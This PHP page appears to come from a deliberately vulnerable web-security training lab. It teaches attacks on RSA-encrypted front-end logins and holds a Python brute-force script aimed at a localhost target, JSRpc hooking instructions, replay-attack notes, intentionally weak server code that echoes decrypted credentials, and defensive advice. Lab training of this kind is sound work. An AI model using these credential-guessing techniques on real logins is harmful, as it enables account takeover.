<?php
/**
 * Pikachu-Enhanced v2.0 - 前端加解密对抗: Level 3 - RSA 非对称加密
 */
$PIKA_ROOT_DIR = "../../";
require_once __DIR__ . '/encrypt_helper.inc.php';

// 处理 POST 解密请求
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $encryptedData = $_POST['data'] ?? null;
    if (!$encryptedData) {
        $rawJson = json_decode(file_get_contents('php://input'), true);
        $encryptedData = $rawJson['data'] ?? null;
    }

    if ($encryptedData) {
        $decryptedData = '';
        $success = openssl_private_decrypt(base64_decode($encryptedData), $decryptedData, ENCRYPT_RSA_PRIVATE_KEY);

        if (!$success || empty($decryptedData)) {
            echo json_encode(['success' => false, 'error' => 'RSA 私钥解密失败，密文损坏或公私钥不匹配'], JSON_UNESCAPED_UNICODE);
            exit;
        }

        $formData = json_decode($decryptedData, true);
        if (isset($formData['username'], $formData['password'])) {
            $authRes = pika_encrypt_verify_user($formData['username'], $formData['password']);
            if ($authRes['success']) {
                echo json_encode([
                    'success' => true,
                    'message' => '🎉 RSA 非对称解密认证成功 (RSA Login Succeeded)',
                    'username' => $authRes['username'],
                    'decrypted_debug' => $formData
                ], JSON_UNESCAPED_UNICODE);
            } else {
                echo json_encode([
                    'success' => false,
                    'error' => $authRes['error'],
                    'decrypted_debug' => $formData
                ], JSON_UNESCAPED_UNICODE);
            }
            exit;
        } else {
            echo json_encode(['success' => false, 'error' => '解密数据结构异常，缺少必要凭据字段'], JSON_UNESCAPED_UNICODE);
            exit;
        }
    } else {
        echo json_encode(['success' => false, 'error' => '缺少 data 加密参数'], JSON_UNESCAPED_UNICODE);
        exit;
    }
}

$SELF_PAGE = substr($_SERVER['PHP_SELF'], strrpos($_SERVER['PHP_SELF'], '/') + 1);
if ($SELF_PAGE == "rsa.php") {
    $ACTIVE = array_fill(0, 360, '');
    $ACTIVE[340] = 'active open';
    $ACTIVE[344] = 'active';
}

include_once $PIKA_ROOT_DIR . 'header.php';
?>

<style>
.crypto-card {
    background: var(--bg-card, #ffffff);
    border: 1px solid var(--border-subtle, #e2e8f0);
    border-radius: 14px;
    padding: 24px;
    margin-bottom: 24px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.04);
}
.inspector-panel {
    background: #0f172a;
    color: #e2e8f0;
    border-radius: 10px;
    padding: 16px;
    font-family: monospace;
    font-size: 13px;
    line-height: 1.6;
    overflow-x: auto;
}
.inspector-title {
    color: #94a3b8;
    font-size: 12px;
    text-transform: uppercase;
    margin-bottom: 8px;
    display: flex;
    align-items: center;
    gap: 6px;
}
.nav-tabs-custom {
    border-bottom: 2px solid #e2e8f0;
    margin-bottom: 20px;
    display: flex;
    gap: 8px;
}
.nav-tabs-custom button {
    background: none;
    border: none;
    padding: 10px 16px;
    font-size: 14px;
    font-weight: 600;
    color: #64748b;
    border-bottom: 2px solid transparent;
    cursor: pointer;
    transition: all 0.2s;
}
.nav-tabs-custom button.active {
    color: #7c3aed;
    border-bottom-color: #7c3aed;
}
.tab-pane-custom {
    display: none;
}
.tab-pane-custom.active {
    display: block;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="<?php echo $PIKA_ROOT_DIR;?>index.php">首页</a></li>
                <li><a href="<?php echo $PIKA_ROOT_DIR;?>vul/encrypt/encrypt.php">前端加解密对抗</a></li>
                <li class="active">Level 3 - RSA 非对称加密</li>
            </ul>
        </div>

        <div class="page-content">
            <!-- 场景标题与说明 -->
            <div style="margin-bottom: 24px;">
                <div style="display:flex; align-items:center; gap:10px; margin-bottom:8px;">
                    <span class="badge" style="background:#7c3aed; font-size:12px; padding:4px 10px;">Level 3</span>
                    <span class="badge" style="background:#6366f1; font-size:12px; padding:4px 10px;">RSA-1024 PKCS#1</span>
                    <span class="badge" style="background:#0f766e; font-size:12px; padding:4px 10px;">Asymmetric Crypto</span>
                </div>
                <h2 style="font-weight: 800; font-size: 24px; margin: 0 0 8px 0; color: #0f172a;">
                    RSA 非对称公钥加密 (RSA Asymmetric Cryptography)
                </h2>
                <p style="font-size: 14px; color: #64748b; margin: 0; line-height: 1.6;">
                    非对称加密体系采用公钥与私钥配对分离的设计。前端代码中仅公开 RSA <code>Public Key</code>，由 <code>JSEncrypt</code> 库执行单向公钥加密；而私钥 <code>Private Key</code> 严格保管于服务端后端。因此攻击者即便逆向提取到公钥，也绝无法直接解密历史网络抓包中的密文！
                </p>
            </div>

            <div class="row">
                <!-- 左侧: 交互式登录挑战卡片 -->
                <div class="col-md-6">
                    <div class="crypto-card">
                        <h4 style="margin:0 0 16px 0; font-weight:700; font-size:16px; display:flex; align-items:center; gap:8px;">
                            <i class="ph-bold ph-lock" style="color:#7c3aed;"></i> RSA 公钥加密认证挑战
                        </h4>

                        <div id="loginAlert" style="display:none; margin-bottom:16px;"></div>

                        <form id="cryptoLoginForm" onsubmit="handleRsaSubmit(event)">
                            <div class="form-group" style="margin-bottom:14px;">
                                <label style="font-weight:600; font-size:13px; color:#334155; margin-bottom:6px; display:block;">账号 (Username):</label>
                                <input type="text" id="username" class="form-control" value="admin" required style="border-radius:8px; padding:10px 12px; height:auto;">
                            </div>
                            <div class="form-group" style="margin-bottom:18px;">
                                <label style="font-weight:600; font-size:13px; color:#334155; margin-bottom:6px; display:block;">密码 (Password):</label>
                                <input type="password" id="password" class="form-control" value="123456" required style="border-radius:8px; padding:10px 12px; height:auto;">
                            </div>

                            <button type="submit" id="submitBtn" class="btn btn-primary btn-block" style="border-radius:8px; font-weight:700; padding:11px; background:#7c3aed; border-color:#7c3aed;">
                                <i class="ph-bold ph-key"></i> RSA 公钥加密并发送
                            </button>
                        </form>
                    </div>

                    <!-- 实时数据流监视器 -->
                    <div class="crypto-card" style="padding: 20px;">
                        <h4 style="margin:0 0 14px 0; font-weight:700; font-size:15px; display:flex; align-items:center; gap:8px;">
                            <i class="ph-bold ph-broadcast" style="color:#0ea5e9;"></i> 前端 RSA 实时加密管道
                        </h4>
                        
                        <div class="inspector-title"><i class="ph-bold ph-key"></i> 1. 前端公开的 RSA 公钥 (Public Key)</div>
                        <div class="inspector-panel" id="inspPubKey" style="margin-bottom:12px; font-size:11px; max-height:100px;"><?php echo htmlspecialchars(ENCRYPT_RSA_PUBLIC_KEY); ?></div>

                        <div class="inspector-title"><i class="ph-bold ph-file-text"></i> 2. 待加密明文负载</div>
                        <div class="inspector-panel" id="inspPlain" style="margin-bottom:12px;">{"username":"admin","password":"..."}</div>

                        <div class="inspector-title"><i class="ph-bold ph-globe"></i> 3. 最终抓包密文 (Wire Payload sent as 'data')</div>
                        <div class="inspector-panel" id="inspCipher" style="margin-bottom:12px;">// 等待发送...</div>

                        <div class="inspector-title"><i class="ph-bold ph-cpu"></i> 4. 服务端私钥解密响应</div>
                        <div class="inspector-panel" id="inspResponse">// 等待服务端响应...</div>
                    </div>
                </div>

                <!-- 右侧: 渗透与对抗指引 -->
                <div class="col-md-6">
                    <div class="crypto-card">
                        <div class="nav-tabs-custom">
                            <button class="active" onclick="switchTab(event, 'tab1')"><i class="ph-bold ph-magnifying-glass"></i> RSA 攻防本质</button>
                            <button onclick="switchTab(event, 'tab2')"><i class="ph-bold ph-terminal"></i> Python 字典公钥加密</button>
                            <button onclick="switchTab(event, 'tab3')"><i class="ph-bold ph-browser"></i> JSRpc 实战渗透</button>
                            <button onclick="switchTab(event, 'tab4')"><i class="ph-bold ph-shield-check"></i> 安全审计要点</button>
                        </div>

                        <!-- Tab 1: RSA 攻防本质 -->
                        <div id="tab1" class="tab-pane-custom active">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🔍 非对称公钥加密的攻防特性与突破口</h5>
                            <ol style="font-size:13.5px; color:#475569; line-height:1.8; padding-left:20px;">
                                <li><strong>为什么无法反向解密密文？</strong>公钥加密的数据只能用私钥解密。由于私钥仅存储在服务器上，攻击者在中间人链路即使抓到了 <code>data=MIGfMA...</code> 密文，在数学上也无法在可接受时间内还原出密码。</li>
                                <li><strong>攻击者的主攻方向：主动加密爆破！</strong>由于<strong>公钥是公开的</strong>，攻击者完全可以使用公开的公钥将攻击字典（如常见弱口令）逐条加密生成合规密文，再批量发送到服务器进行暴力破解或凭据撞库！</li>
                                <li><strong>重放攻击风险：</strong>如果公钥加密的内容中没有包含动态随机数 (Nonce) 或时间戳，攻击者虽然无法解密，但可以直接<strong>完整重放密文</strong>伪造用户登录！</li>
                            </ol>
                        </div>

                        <!-- Tab 2: Python 爆破脚本 -->
                        <div id="tab2" class="tab-pane-custom">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🐍 Python 公钥加密流水线爆破脚本</h5>
                            <pre style="background:#0f172a; color:#f8fafc; border-radius:8px; padding:14px; font-size:12px; line-height:1.5; max-height:360px; overflow-y:auto;"><code>import json
import base64
import requests
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

TARGET_URL = "http://127.0.0.1:8765/vul/encrypt/rsa.php"

# 从前端提取的 RSA 公钥
PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi
NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM
DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb
ocDbsNeCwNpRxwjIdQIDAQAB
-----END PUBLIC KEY-----"""

rsa_key = RSA.import_key(PUBLIC_KEY_PEM)
cipher = PKCS1_v1_5.new(rsa_key)

def rsa_encrypt_payload(username, password):
    raw_json = json.dumps({"username": username, "password": password})
    enc_bytes = cipher.encrypt(raw_json.encode('utf-8'))
    return base64.b64encode(enc_bytes).decode('utf-8')

# 暴力破解测试
passwords = ["admin", "root", "123456", "password"]
for pwd in passwords:
    ciphertext = rsa_encrypt_payload("admin", pwd)
    resp = requests.post(TARGET_URL, data={"data": ciphertext})
    result = resp.json()
    if result.get("success"):
        print(f"[+] 密码破解成功: admin / {pwd}")
        break
    else:
        print(f"[-] 尝试 {pwd} -> {result.get('error')}")
</code></pre>
                        </div>

                        <!-- Tab 3: JSRpc 实战 -->
                        <div id="tab3" class="tab-pane-custom">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🌐 JSRpc 浏览器环境远程调用</h5>
                            <p style="font-size:13.5px; color:#475569; line-height:1.6;">
                                若前端加密逻辑极其复杂（如带有各种反调试、动态混淆、魔改填充），完全无需耗时逆向 Python 还原。在浏览器控制台注册全局 RPC 服务：
                            </p>
                            <pre style="background:#0f172a; color:#f8fafc; border-radius:8px; padding:12px; font-size:12px; line-height:1.5;"><code>// 注入 JSRpc 客户端后，注册加密方法:
demo.regAction("rsaEncrypt", function (resolve, param) {
    const data = JSON.parse(param);
    const encryptor = new JSEncrypt();
    encryptor.setPublicKey(publicKey);
    resolve(encryptor.encrypt(JSON.stringify(data)));
});
// 随后在 Burp 或 Python 中直接调用 http://127.0.0.1:12080/go?action=rsaEncrypt 获取密文！</code></pre>
                        </div>

                        <!-- Tab 4: 安全加固建议 -->
                        <div id="tab4" class="tab-pane-custom">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🛡️ 纵深防御规范</h5>
                            <p style="font-size:13.5px; color:#475569; line-height:1.7;">
                                1. <strong>加入动态挑战随机数：</strong>必须在登录表单中加入服务端预先生成的短期 Nonce，强制载入 RSA 加密体中，服务端校验一次性消费，彻底杜绝密文直接重放。<br>
                                2. <strong>结合账户锁定与风控：</strong>针对公开公钥带来的自动化字典加密爆破风险，服务端必须部署多维度防暴力破解策略（IP 速率限制、图形人机验证、连续失败阶梯封禁）。
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script src="<?php echo $PIKA_ROOT_DIR;?>assets/js/jsencrypt.min.js"></script>

<script>
const RSA_PUB_KEY = `<?php echo trim(ENCRYPT_RSA_PUBLIC_KEY); ?>`;

function switchTab(evt, tabId) {
    document.querySelectorAll('.nav-tabs-custom button').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-pane-custom').forEach(p => p.classList.remove('active'));
    evt.currentTarget.classList.add('active');
    document.getElementById(tabId).classList.add('active');
}

function handleRsaSubmit(e) {
    e.preventDefault();
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const alertBox = document.getElementById('loginAlert');
    const submitBtn = document.getElementById('submitBtn');

    submitBtn.disabled = true;
    submitBtn.innerHTML = '<i class="ph-bold ph-spinner ph-spin"></i> RSA 公钥运算中...';

    // 1. 构建明文 JSON
    const payloadObj = { username: username, password: password };
    const jsonStr = JSON.stringify(payloadObj);
    document.getElementById('inspPlain').textContent = jsonStr;

    // 2. 初始化 JSEncrypt 执行公钥加密
    const encryptor = new JSEncrypt();
    encryptor.setPublicKey(RSA_PUB_KEY);
    const encrypted = encryptor.encrypt(jsonStr);

    if (!encrypted) {
        alertBox.style.display = 'block';
        alertBox.className = 'alert alert-danger';
        alertBox.innerHTML = '<i class="ph-bold ph-warning"></i> RSA 加密失败，请检查公钥格式或数据长度！';
        submitBtn.disabled = false;
        submitBtn.innerHTML = '<i class="ph-bold ph-key"></i> RSA 公钥加密并发送';
        return;
    }

    document.getElementById('inspCipher').textContent = "data=" + encodeURIComponent(encrypted);

    // 3. 提交加密请求
    const formData = new URLSearchParams();
    formData.append('data', encrypted);

    fetch('rsa.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8'
        },
        body: formData.toString()
    })
    .then(r => r.json())
    .then(data => {
        document.getElementById('inspResponse').textContent = JSON.stringify(data, null, 2);
        alertBox.style.display = 'block';
        if (data.success) {
            alertBox.className = 'alert alert-success';
            alertBox.innerHTML = '<i class="ph-bold ph-check-circle"></i> <strong>' + data.message + '</strong> [' + data.username + '] 登录成功！';
        } else {
            alertBox.className = 'alert alert-danger';
            alertBox.innerHTML = '<i class="ph-bold ph-x-circle"></i> <strong>验证失败:</strong> ' + (data.error || '用户名或密码错误');
        }
    })
    .catch(err => {
        document.getElementById('inspResponse').textContent = 'Request Error: ' + err.message;
        alertBox.style.display = 'block';
        alertBox.className = 'alert alert-danger';
        alertBox.innerHTML = '<i class="ph-bold ph-warning"></i> 请求发生异常';
    })
    .finally(() => {
        submitBtn.disabled = false;
        submitBtn.innerHTML = '<i class="ph-bold ph-key"></i> RSA 公钥加密并发送';
    });
}
</script>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
